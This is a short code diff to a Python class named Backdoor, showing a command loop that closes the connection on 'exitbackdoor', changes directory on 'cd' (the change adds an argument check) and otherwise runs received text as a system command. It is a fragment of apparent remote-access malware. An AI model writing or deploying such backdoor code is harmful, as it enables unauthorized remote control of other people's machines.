@@ -35,7 +35,7 @@ class Backdoor:
             if command[0] == "exitbackdoor":
                 self.connection.close()
                 exit()
-            elif command[0] == "cd":
+            elif command[0] == "cd" and len(command) > 1:
                 command_result = self.change_current_directory(command[1])
             else:
                 command_result = self.execute_system_command(command)
